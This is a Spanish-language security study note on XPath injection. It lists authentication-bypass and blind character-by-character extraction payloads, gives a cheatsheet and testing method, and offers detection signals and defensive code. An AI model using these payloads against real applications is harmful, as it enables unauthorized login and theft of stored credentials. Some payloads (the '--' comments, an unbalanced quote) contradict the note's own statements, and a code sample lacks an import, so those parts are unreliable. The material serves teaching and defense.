---
aliases: ["XPath Vulnerabilities", "Inyección XPath", "XPath Injection"]
tags:
  - sec/web
  - sec/web/xpath
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[SQL Injection]]"
  - "[[Inyecciones LDAP]]"
  - "[[Local File Inclusion]]"
  - "[[Gestión de Autenticación]]"
fuente: "https://owasp.org/www-community/attacks/Xpath_Injection"
---

# XPath y sus Vulnerabilidades

**XPath** (*XML Path Language*) es el lenguaje de consultas sobre la estructura de un documento XML: selecciona nodos por ruta, atributos y predicados. Cuando una aplicación construye esas consultas **concatenando entrada del usuario** — el patrón arquetípico "login contra un `users.xml`" — aparece **inyección XPath**, el primo XML de [[SQL Injection]]: misma lógica de bypass y extracción, otro motor de ejecución y, a diferencia de SQL, **sin prepared statements en la sintaxis cruda**.

> [!info] XPath en dos minutos
> - Documento: `<users><user><name>ana</name><pass>secret</pass></user>...</users>`
> - Consulta típica: `//user[name='ana' and pass='secret']`
> - `//` = buscar en cualquier parte del árbol; `user[...]` = predicado (filtro); `and`/`or` componen condiciones; `'` delimita literales.
> - XPath 1.0 **no tiene escape de comillas**: si la app concatena, romper el literal es trivial.

## Gramática esencial para explotar

| Elemento | Ejemplo | Uso en ataque |
|---|---|---|
| Literal de texto | `'texto'` (o `"texto"`) | Romper con `admin' or '1'='1` |
| Predicado | `user[@role='admin']` | Extraer por atributos |
| `or` / `and` | `a='x' or '1'='1'` | Bypass de autenticación |
| `//` | `//user` | Descubrir estructura |
| `text()` | `//pass/text()` | Extraer valores de texto |
| `string()` | `string(//user[1]/pass)` | Convertir nodo→texto para blind |
| `concat()` | `concat(a,b)` | Construir comparaciones compuestas |
| `substring(s, pos, len)` | `substring(//pass,1,1)='a'` | **Blind char-by-char** |
| `contains()`, `starts-with()` | `contains(name,'ad')` | Enumeración con menos round-trips |
| `count()` | `count(//user)` | Dimensión del dataset (oráculo booleano) |
| `position()`, `last()` | `//user[2]` | Filas concretas |
| `normalize-space()` | `normalize-space(//name)` | Evitar falsos negativos por espacios |
| `name()`, `local-name()` | `name(//*[1])` | Enumerar nombres de nodo |

### Puntos de inyección típicos

| Contexto | Consulta vulnerable | Entrada del usuario |
|---|---|---|
| **Login** | `//user[name='$u' and pass='$p']` | usuario / contraseña |
| Búsqueda | `//book[title[contains(.,'$q')]]` | término de búsqueda |
| Ruta/ID | `//user[@id='$id']` | parámetro de URL |
| Filtros | `//product[cat='$cat' and price<$max]` | filtros de catálogo |

## Técnicas de explotación

### 1. Bypass de autenticación (in-band)

```
Usuario: admin' or '1'='1' --
Contraseña: (cualquiera)
```

Consulta resultante: `//user[name='admin' or '1'='1' --' and pass='...']`. Variantes:

```
admin' or 'x'='x
' or //user[position()=1]/name='admin' --
x' or 1=1 or 'a'='b
' or substring(//user[1]/name,1,1)='a' and '1'='1
```

### 2. Error-based

Payloads que rompan la sintaxis (`'`, `)`, `//*`) y lean el mensaje del motor: librerías PHP antiguas devuelven el texto del error del parser en la respuesta.

### 3. Blind booleano

Cuando la consulta no devuelve datos, solo éxito/fallo (login ok/no, 200/500, longitud distinta). Extracción carácter a carácter:

```
admin' and substring(//user[name='admin']/pass,1,1)='a' and '1'='1
admin' and substring(//user[name='admin']/pass,2,1)='b' and '1'='1
```

Automatizable con Intruder (sniper sobre posiciones) o script con búsqueda binaria sobre el orden de caracteres.

### 4. Extracción con `string()` y `concat()`

Cuando parte del árbol es accesible pero no el nodo entero:

```
' or string(//user[position()=1]/name)='root' or '
' or concat(//user[1]/name,'-',//user[1]/pass)='ana-secret' or '
```

### 5. Descubrimiento de estructura (fuerza bruta de rutas)

Antes de extraer hay que saber qué hay: prueba de rutas (`//users`, `//admin/credentials`, `//config/apikeys`) con predicados que confirmen existencia (`' or count(//users)>0 or 'a'='b`).

### Catálogo de payloads

```
' or '1'='1' or ''='
x' or 1=1 or 'a'='b
' or //user[position()=1]/name='admin' --
admin' and substring(//user/pass,1,1)='a' and '1'='1
' or count(//user)>0 or 'a'='b
' or contains(name('//*[1]),'u') or 'a'='b
' or normalize-space(//user[1]/name)='root' or 'a'='b
```

> [!tip] Contexto: ¿comillas simples o dobles?
> Si la app envuelve la entrada en `'...'`, se rompe con `'`; si usa `"..."`, con `"`. En XPath 1.0 no hay escape estándar de comillas: eso hace el bypass trivial cuando hay concatenación.

## Metodología de testing

1. **Localizar consultas XML**: login, búsqueda, filtros; apps con backend XML o ficheros `.xml` como base de datos de usuarios; también .NET/Java con `XPathNavigator`/`Document.selectNodes`.
2. **Inyectar `'`** y observar: ¿500/parser error? ¿mismo 200? El cambio de comportamiento confirma.
3. **Probar bypass de login** (in-band) y, si no hay salida, **blind booleano** midiendo respuesta/longitud/timing.
4. **Mapear estructura** con `count()`/predicados y **extraer** con `substring` + `string()`.
5. **Escalar**: si el backend expone funciones como `document()` (XSLT), intentar lectura de archivos ([[Local File Inclusion]]); en entornos XSLT con extensiones habilitadas, incluso ejecución.

## Catálogo de vulnerabilidades (base original)

A continuación, el catálogo y las medidas originales de la nota:


**XPath** es un lenguaje de consultas utilizado en **XML** que permite buscar y recuperar información específica de **documentos XML**. Sin embargo, al igual que otros lenguajes de programación y consultas, XPath también puede tener **vulnerabilidades** que los atacantes pueden aprovechar para comprometer la seguridad de una aplicación web.

> [!info] ¿Qué es XPath?
> XPath (XML Path Language) es un lenguaje diseñado para seleccionar nodos de un documento XML. No es un lenguaje de programación completo, sino un lenguaje de expresión que se utiliza para navegar a través de elementos y atributos en un documento XML. Es fundamental para XSLT (eXtensible Stylesheet Language Transformations) y XQuery.

Las **vulnerabilidades XPath** son aquellas que se aprovechan de las debilidades en la implementación de consultas XPath en una aplicación web. A continuación, se describen algunos tipos de vulnerabilidades comunes en XPath:

## Catálogo de vulnerabilidades (base original)

#### Inyección XPath

Los atacantes pueden utilizar inyección de código malicioso en las consultas XPath para alterar el comportamiento esperado de la aplicación. Por ejemplo, pueden agregar una consulta maliciosa que recupere toda la información del usuario, incluso información confidencial como contraseñas.

> [!warning] Ejemplo de Inyección XPath
> Supongamos que una aplicación autentica usuarios con una consulta XPath como:
> `//users/user[username='<input_username>' and password='<input_password>']`
> Un atacante podría inyectar:
> `username='admin' and password='' or '1'='1`
> La consulta resultante sería:
> `//users/user[username='admin' and password='' or '1'='1' and password='<input_password>']`
> Esto podría autenticar al atacante como 'admin' si el primer `password=''` es verdadero o si `1=1` es verdadero, ignorando la contraseña real.

#### Fuerza Bruta de XPath

Los atacantes pueden utilizar técnicas de fuerza bruta para adivinar las rutas de XPath y recuperar información confidencial. Esta técnica se basa en intentar diferentes rutas XPath hasta encontrar una que devuelva información confidencial.

> [!tip] Cómo funciona la Fuerza Bruta de XPath
> A diferencia de la inyección, que busca manipular la lógica de la consulta, la fuerza bruta intenta descubrir la estructura del documento XML o los nombres de los nodos. Por ejemplo, si un atacante sospecha que existe un nodo `//users/admin_data`, podría probar esa ruta. También puede combinarse con inyección para adivinar valores carácter por carácter (blind XPath injection).

#### Recuperación de Información del Servidor

Los atacantes pueden utilizar consultas XPath maliciosas para obtener información sobre el servidor, como el tipo de base de datos, la versión de la aplicación, etc. Esta información puede ayudar a los atacantes a planear ataques más sofisticados.

> [!info] Exfiltración de Información
> Algunas implementaciones de XPath permiten el uso de funciones que interactúan con el sistema de archivos o el entorno del servidor (por ejemplo, `document()`, `collection()`). Si no están restringidas, un atacante podría intentar leer archivos locales o acceder a recursos externos, aunque esto es menos común en implementaciones modernas y seguras.

#### Manipulación de Respuestas XPath

Los atacantes pueden manipular las respuestas XPath de la aplicación web para obtener información adicional o alterar el comportamiento de la aplicación. Por ejemplo, pueden modificar una respuesta XPath para crear una cuenta de usuario sin permiso.

> [!warning] Impacto de la Manipulación de Respuestas
> Si una aplicación utiliza la salida de una consulta XPath para tomar decisiones o renderizar contenido, la manipulación de esta salida puede llevar a escalada de privilegios, divulgación de información o incluso ejecución de código si la salida se procesa de forma insegura (por ejemplo, en un contexto XSLT que permite extensiones).

### Medidas de protección (catálogo original)

Para protegerse contra las vulnerabilidades de XPath, es importante validar todas las entradas de usuario y evitar la construcción dinámica de consultas XPath. Además, se recomienda restringir los permisos de acceso a los recursos de la aplicación web y mantener actualizado el software y los sistemas operativos. Por último, se recomienda utilizar herramientas de análisis de seguridad y realizar pruebas de penetración regulares para identificar y corregir cualquier vulnerabilidad en la aplicación web.

> [!tip] Estrategias de Mitigación Clave
> 1.  **Validación de Entradas**: Implementar listas blancas (whitelisting) para caracteres permitidos en las entradas de usuario que se usarán en consultas XPath.
> 2.  **Consultas Parametrizadas**: Utilizar APIs que permitan pasar parámetros a las consultas XPath en lugar de concatenar cadenas, similar a las consultas preparadas en SQL. Esto evita que la entrada del usuario sea interpretada como parte de la lógica de la consulta.
> 3.  **Restricción de Funciones XPath**: Deshabilitar o restringir funciones XPath peligrosas (como `document()`, `collection()`, `key()`) si no son estrictamente necesarias.
> 4.  **Principio de Mínimo Privilegio**: Asegurar que el proceso que ejecuta las consultas XPath tenga los mínimos permisos necesarios para acceder a los recursos del sistema.
> 5.  **Actualizaciones y Parches**: Mantener el motor XPath y el software de la aplicación actualizados para protegerse contra vulnerabilidades conocidas.
> 6.  **Análisis de Seguridad y Pentesting**: Realizar auditorías de código y pruebas de penetración para identificar y remediar posibles puntos débiles.
## Detección

| Señal | Qué indica |
|---|---|
| 500 con error del parser XPath tras inyectar `'` | Concatenación de entrada en la consulta |
| Login acepta `' or '1'='1` como usuario | Bypass in-band directo |
| Respuesta distinta (200 vs 401/500) según predicado booleano | Ceguera explotable: blind XPath |
| Tiempos de respuesta variables con `substring(...)=` | Oráculo booleano (timing) |
| Estructura del XML reflejada en errores | Fuga de nombres de nodo |

## Impacto y riesgo

- **Bypass de autenticación** completa (login XPath es el caso de libro).
- **Extracción del documento XML completo** carácter a carácter: usuarios, contraseñas (a menudo en claro en el XML), API keys, datos de negocio.
- **Escalada de privilegios** si la consulta gobierna roles (`//user[@role='admin']`).
- En XSLT con funciones peligrosas (`document()`): lectura de ficheros ([[Local File Inclusion]]) y, con extensiones, ejecución.

## Defensa (con código)

### 1. No concatenar: entradas aisladas y validadas

XPath 1.0 **no define parámetros**; las APIs parametrizadas existen solo en XQuery/motores modernos. Por eso la defensa real tiene dos capas: no construir la consulta con datos del usuario y, si hay que insertarlos, validarlos duramente.

```python
# Python (lxml) — ✅ rechazo de comillas + allowlist estricta de identificadores
import re
from lxml import etree

def safe_literal(s: str) -> str:
    if "'" in s or '"' in s or "\\" in s:
        raise ValueError("entrada inválida para XPath")
    return s

USER_OK = re.compile(r"^[a-zA-Z0-9_.-]{1,64}$")   # allowlist de identificadores
if not USER_OK.match(username):
    return deny()
xp = f"//user[name='{safe_literal(username)}' and pass='{safe_literal(password)}']"
```

```python
# ✅ Preferible: parsear el XML una vez y comparar en código, sin XPath del usuario
tree = etree.parse("users.xml")
if any(u.findtext("name") == username and
       secrets.compare_digest(u.findtext("pass", ""), password)   # comparación constante
       for u in tree.findall(".//user")):
    login_ok()
```

### 2. XQuery con variables externas (el verdadero "parametrized XPath")

```xquery
declare variable $u external;
declare variable $p external;
//user[name = $u and pass = $p]
```

```java
// Java con Saxon: vincular variables sin tocar la consulta
XQueryEvaluator q = processor.compileQuery(Paths.get("login.xq").toFile());
q.setExternalVariable(new QName("u"), new XdmAtomicValue(username));
q.setExternalVariable(new QName("p"), new XdmAtomicValue(password));
```

### 3. Restringir funciones y privilegios del motor

- Deshabilitar `document()`, `collection()`, `key()` y extensiones XSLT si no son necesarias (a nivel de `XPathFunctionResolver`/features del motor).
- El proceso que parsea XML con mínimos permisos: sin acceso a ficheros ni red (conexión con [[Server-Side Request Forgery (SSRF)]] y XXE en el mismo stack XML).

### 4. Comparar en tiempo constante y respuestas uniformes

Mismo mensaje y mismo tiempo de respuesta exista o no el usuario (ver [[Gestión de Autenticación]]): sin eso, el propio timing enumera usuarios incluso sin inyección.

## Errores comunes

**Atacante:**
1. Copiar payloads SQL literalmente: en XPath no existen `--` como comentario universal (el comentario XPath no está definido en 1.0) — usar `' or '1'='1` y cerrar comillas limpiamente.
2. Olvidar el contexto de comillas: probar ambos `'` y `"`.
3. Automatizar blind sin fijar el oráculo primero: confirmá con un predicado siempre-verdadero y siempre-falso antes de barrer.
4. Ignorar `normalize-space()`: nodos con espacios/CDATAs rompen la comparación carácter a carácter.

**Defensor:**
1. "Validamos alfa-numérico" con regex que incluye comillas o espacios.
2. Escapar comillas duplicando (`''`) pensando en SQL: XPath 1.0 no lo soporta.
3. Usar `document()` en XSLT de la app con rutas controlables por el usuario.
4. Devolver mensajes de error del parser XPath al cliente.

## Cheatsheet

```text
# Bypass de login
Usuario: admin' or '1'='1' --
        ' or //user[position()=1]/name()='admin' --   (variante)

# Oráculo booleano (blind)
' and substring(//user[name='admin']/pass,1,1)='a' and '1'='1
' and count(//user)>0 and '1'='1

# Extracción
' or string(//user[1]/name)='root' or 'a'='b
' or concat(//user[1]/name,':',//user[1]/pass)='ana:secret' or 'a'='b

# Estructura
' or contains(name('//*[1]),'u') or 'a'='b
' or normalize-space(//user[1])='...' or 'a'='b
```

## Laboratorios y referencias

- OWASP — XPath Injection: https://owasp.org/www-community/attacks/Xpath_Injection
- PortSwigger — XPath injection (material): https://portswigger.net/web-security/sql-injection (la técnica de blind/union es transferible 1:1, ver [[SQL Injection]])
- PayloadsAllTheThings — XPath Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPath%20Injection
- lxml (hardening XML/XPath en Python): https://lxml.de/

## Relacionadas

- [[SQL Injection]] — el hermano mayor: mismas técnicas de blind, union y extracción
- [[Inyecciones LDAP]] — otra familia de lenguajes de consulta con el mismo patrón de concatenación
- [[Local File Inclusion]] — vía `document()` en XSLT sin restringir
- [[Gestión de Autenticación]] — el login XPath es un caso de estudio de autenticación rota
- [[Server-Side Request Forgery (SSRF)]] — motores XML/XPath con acceso a red
